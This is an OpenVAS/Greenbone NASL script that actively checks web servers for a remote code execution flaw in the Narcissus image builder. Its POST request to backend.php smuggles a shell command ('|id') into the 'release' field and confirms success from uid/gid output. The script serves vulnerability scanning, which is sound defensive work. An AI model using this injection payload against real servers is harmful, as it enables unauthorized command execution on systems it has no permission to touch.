# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103607");
  script_version("2023-01-05T10:12:14+0000");
  script_tag(name:"last_modification", value:"2023-01-05 10:12:14 +0000 (Thu, 05 Jan 2023)");
  script_tag(name:"creation_date", value:"2012-11-14 16:22:01 +0100 (Wed, 14 Nov 2012)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Narcissus RCE Vulnerability (Nov 2012) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Narcissus is prone to a vulnerability that lets attackers
  execute arbitrary code.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code
  within the context of the affected webserver process.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22709/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

data = "machine=0&action=configure_image&release=|id";
headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );

foreach dir( make_list_unique( "/narcissus", "/narcissus-master", http_cgi_dirs( port:port ) ) ) {
  res = http_get_cache( port:port, item:dir + "/index.html");
  if( res !~ "^HTTP/1\.[01] 200" || "<title>Narcissus - Online image" >!< res )
    continue;

  if( dir == "/" )
    dir = "";

  url = dir + "/backend.php";

  req = http_post_put_req( port:port, url:url, data:data, add_headers:headers );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( res =~ "uid=[0-9]+.*gid=[0-9]+" ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
